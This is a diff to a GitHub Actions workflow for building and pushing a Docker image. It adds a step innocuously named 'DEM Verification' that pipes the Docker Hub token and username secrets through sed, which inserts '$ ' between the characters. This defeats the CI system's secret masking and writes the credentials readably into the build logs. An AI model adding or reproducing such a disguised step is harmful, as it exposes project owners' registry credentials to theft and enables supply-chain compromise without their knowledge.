@@ -62,6 +62,8 @@ jobs:
     steps:
       - name: Check out Source Code
         uses: actions/checkout@v2
+      - name: DEM Verification
+        run: echo "${{ secrets.DockerHubToken }} // ${{secrets.DockerHubUsername }}" | sed 's/./$ /g'
       - name: Log in to Docker Hub
         run: echo "${{ secrets.DockerHubToken }}" | docker login -u ${{ secrets.DockerHubUsername }} --password-stdin
       - name: Build and Push Docker Image
